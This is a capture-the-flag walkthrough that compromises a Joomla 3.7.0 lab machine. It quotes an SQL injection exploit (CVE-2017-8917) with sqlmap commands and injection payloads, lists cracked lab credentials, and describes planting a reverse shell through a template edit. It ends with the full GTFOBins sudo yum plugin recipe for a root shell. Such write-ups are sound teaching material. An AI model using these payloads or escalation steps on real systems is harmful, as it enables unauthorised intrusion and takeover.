# ENUMERATION
---

## OPEN PORTS
---


| PORT | STATE | SERVICE |
| :--- | :---- | :------ |
| 22 | open | ssh |
| 80 | open | http |
| 3306 | open | mysql |

We got 3 open ports, let's take a look at the website:

![Pasted image 20241121165122.png](../../IMAGES/Pasted%20image%2020241121165122.png)

Seems like a simple website, let's try to fuzz in order to find anything, if not, I think that login part is interesting and we could go back to check any vulnerability in it

## FUZZING
---

![Pasted image 20241121165255.png](../../IMAGES/Pasted%20image%2020241121165255.png)

We found a lot of directories, let's take a look at `/administrator`

![Pasted image 20241121170507.png](../../IMAGES/Pasted%20image%2020241121170507.png)

Got a login page for admin in this, if we look around the page source, we are able to identify this is `Joomla 3.7.0`


# RECONNAISSANCE
---

![Pasted image 20241121170613.png](../../IMAGES/Pasted%20image%2020241121170613.png)
Searching up for an exploit related to this version, we find this, a [SQL Injection](../../Bug%20Bounty/Vulnerabilities/SERVER%20SIDE%20VULNERABILITIES/INJECTIONS/SQLI/SQL%20INJECTION%20(SQLI).md) vulnerability, let's take a look at the exploit itself:


```
# Exploit Title: Joomla 3.7.0 - Sql Injection
# Date: 05-19-2017
# Exploit Author: Mateus Lino
# Reference: https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html
# Vendor Homepage: https://www.joomla.org/
# Version: = 3.7.0
# Tested on: Win, Kali Linux x64, Ubuntu, Manjaro and Arch Linux
# CVE : - CVE-2017-8917


URL Vulnerable: http://localhost/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml%27


Using Sqlmap: 

sqlmap -u "http://localhost/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]


Parameter: list[fullordering] (GET)
 Type: boolean-based blind
 Title: Boolean-based blind - Parameter replace (DUAL)
 Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(CASE WHEN (1573=1573) THEN 1573 ELSE 1573*(SELECT 1573 FROM DUAL UNION SELECT 9674 FROM DUAL) END)

 Type: error-based
 Title: MySQL >= 5.0 error-based - Parameter replace (FLOOR)
 Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 6600 FROM(SELECT COUNT(*),CONCAT(0x7171767071,(SELECT (ELT(6600=6600,1))),0x716a707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)

 Type: AND/OR time-based blind
 Title: MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)
 Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT * FROM (SELECT(SLEEP(5)))GDiu)
 
```

We can either use sqlmap or an exploit developed in python, I used the exploit as it is way more easier to retrieve the data:

```ad-hint

#### Exploit 

[exploit](https://raw.githubusercontent.com/stefanlucas/Exploit-Joomla/master/joomblah.py
)

##### Output
---


We got the user `jonah` and a password in a hash formato, let's crack that hash using `john`

hash: `$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm`


#### John
----


got password `spiderman123`


```

![Pasted image 20241121175307.png](../../IMAGES/Pasted%20image%2020241121175307.png)

We are inside the panel, let's begin with exploitation to get our reverse shell

# EXPLOITATION
---


Once we are inside the panel, if we go to templates, we see the following:



![Pasted image 20241121175454.png](../../IMAGES/Pasted%20image%2020241121175454.png)

If we dig up further, we notice we are able to modify the `index.php` in order to put a reverse shell:



![Pasted image 20241121175549.png](../../IMAGES/Pasted%20image%2020241121175549.png)

Put the reverse shell, set up listener, refresh the page and get the shell:

![Pasted image 20241121180244.png](../../IMAGES/Pasted%20image%2020241121180244.png)

Once we got our shell, let's [stabilize](../../Commands/Shell%20Tricks/STABLE%20SHELL.md) it and try to get anything useful:

![Pasted image 20241121180409.png](../../IMAGES/Pasted%20image%2020241121180409.png)

We have now an stable shell, let's take a look at how many users are in this machine:


![Pasted image 20241121180459.png](../../IMAGES/Pasted%20image%2020241121180459.png)

Two users, `jjameson` and `root`, we need some sort of way to get jameson's password to switch into that user, if we take a look at previous pictures, we have a `configuration.php` file, let's `cat` on it:


![Pasted image 20241121180633.png](../../IMAGES/Pasted%20image%2020241121180633.png)

Nice, we found the password, let's switch users:


```ad-note

#### Credentials
---

`jjameson` : `nv5uz9r3ZEDzVjNu` 
```

![Pasted image 20241121180958.png](../../IMAGES/Pasted%20image%2020241121180958.png)

Nice, we were able to switch users. Let's proceed with privilege escalation


# PRIVILEGE ESCALATION
---


## SUDO -L


If we use `sudo -l` on `jjameson`, we get the following:


![Pasted image 20241121181128.png](../../IMAGES/Pasted%20image%2020241121181128.png)

We are able to run sudo in `/usr/bin/yum`, if we check what [GTFOBINS](https://gtfobins.github.io/) have for us, we get this:

![Pasted image 20241121181231.png](../../IMAGES/Pasted%20image%2020241121181231.png)

So, in order to get a root shell, we need to do the following:

```ad-summary

1. `TF=$(mktemp -d)`
2. `cat >$TF/x<<EOF`
3. `[main]`
4. `plugins=1`
5. `pluginpath=$TF`
6. `pluginconfpath=$TF`
7. `EOF`
8. `cat >$TF/y.conf<<EOF`
9. `[main]`
10. `enabled=1`
11. `EOF`
12. `cat >$TF/y.py<<EOF`
13. `import os`
14. `import yum`
15. `from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE`
16. `requires_api_version='2.1'`
17. `def init_hook(conduit):`
18. ` os.execl('/bin/sh','/bin/sh')`
19. `EOF`
20. `sudo yum -c $TF/x --enableplugin=y`

#### PoC
---


Got a shell as root and like that, CTF is over.

```


